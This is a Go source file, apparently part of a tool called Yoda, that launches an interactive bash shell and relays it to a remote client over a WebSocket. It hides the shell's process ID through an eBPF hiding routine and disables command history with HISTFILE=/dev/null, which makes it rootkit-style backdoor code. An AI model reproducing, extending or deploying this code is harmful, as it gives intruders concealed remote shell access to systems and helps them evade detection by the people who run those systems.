// TLS PTY session handler: launches interactive shell over TLS, manages terminal size and I/O

package services

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"sync"

	"github.com/cezamee/Yoda/internal/core/ebpf"
	"github.com/creack/pty"
	"github.com/gorilla/websocket"
)

type WSMessage struct {
	Type string `json:"type"`
	Data []byte `json:"data,omitempty"`
	Rows int    `json:"rows,omitempty"`
	Cols int    `json:"cols,omitempty"`
}

func HandleWebSocketPTYSession(conn *websocket.Conn) {

	cmd := exec.Command("/bin/bash", "-l", "-i")
	cmd.Env = []string{
		"TERM=xterm-256color",
		"SHELL=/bin/bash",
		"LANG=en_US.UTF-8",
		"LC_ALL=en_US.UTF-8",
		"PS1=\\[\\033[01;32m\\]yoda@ws\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ",
		"HISTFILE=/dev/null",
	}

	ptmx, err := pty.Start(cmd)
	if err != nil {
		fmt.Printf("❌ Failed to start PTY: %v\n", err)
		return
	}

	go func(pid int) {
		err := ebpf.AddPIDToHiding(pid)
		if err != nil {
			fmt.Printf("⚠️ Error hiding PID for bash: %v\n", err)
		} else {
			fmt.Printf("👻 Bash PID %d hidden successfully\n", pid)
		}
	}(cmd.Process.Pid)

	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("🚨 PTY service panic: %v\n", r)
		}
		fmt.Printf("🧹 Cleaning up WebSocket PTY session...\n")
		ptmx.Close()
		if cmd.Process != nil {
			fmt.Printf("🧹 Terminating bash process (PID: %d)\n", cmd.Process.Pid)
			cmd.Process.Kill()
			cmd.Wait()
			fmt.Printf("✅ Bash process cleaned up\n")
		}
	}()

	rows, cols := 24, 80
	_ = pty.Setsize(ptmx, &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)})

	ptmx.Write([]byte("alias ls='ls --color=auto'\n"))
	ptmx.Write([]byte("clear\n"))

	done := make(chan struct{})
	var doneOnce sync.Once

	// Goroutine: PTY -> WebSocket (shell output to client)
	go func() {
		buffer := make([]byte, 4*1024)

		for {
			select {
			case <-done:
				return
			default:
				n, err := ptmx.Read(buffer)

				if err != nil {
					doneOnce.Do(func() { close(done) })
					return
				}

				if n > 0 {
					msg := WSMessage{
						Type: "data",
						Data: buffer[:n],
					}
					msgBytes, err := json.Marshal(msg)
					if err != nil {
						doneOnce.Do(func() { close(done) })
						return
					}

					if err := conn.WriteMessage(websocket.TextMessage, msgBytes); err != nil {
						if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
							fmt.Printf("📡 WebSocket unexpected close during PTY output: %v\n", err)
						}
						doneOnce.Do(func() { close(done) })
						return
					}
				}
			}
		}
	}()

	// Main loop: WebSocket -> PTY (client input to shell)
	for {
		select {
		case <-done:
			fmt.Printf("📡 WebSocket PTY session ended\n")
			return
		default:

			msgType, msgBytes, err := conn.ReadMessage()
			if err != nil {
				if websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
					fmt.Printf("📡 WebSocket closed normally: %v\n", err)
				} else if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
					fmt.Printf("📡 WebSocket unexpected close: %v\n", err)
				} else {
					fmt.Printf("📡 WebSocket closed: %v\n", err)
				}
				doneOnce.Do(func() { close(done) })
				return
			}

			if msgType == websocket.CloseMessage {
				fmt.Printf("📡 Received close message from client\n")
				doneOnce.Do(func() { close(done) })
				return
			}

			var msg WSMessage
			if err := json.Unmarshal(msgBytes, &msg); err != nil {
				continue
			}

			switch msg.Type {
			case "data":
				if len(msg.Data) > 0 {
					if len(msg.Data) == 1 && msg.Data[0] == 4 {
						doneOnce.Do(func() { close(done) })
						fmt.Printf("📡 Ctrl+D received, closing PTY\n")
						return
					}
					_, err := ptmx.Write(msg.Data)
					if err != nil {
						doneOnce.Do(func() { close(done) })
						fmt.Printf("❌ Failed to write to PTY: %v\n", err)
						return
					}
				}
			case "resize":
				if msg.Rows > 0 && msg.Cols > 0 {
					_ = pty.Setsize(ptmx, &pty.Winsize{Rows: uint16(msg.Rows), Cols: uint16(msg.Cols)})
					fmt.Printf("📐 Terminal resized to %dx%d\n", msg.Cols, msg.Rows)
				}
			}
		}
	}
}
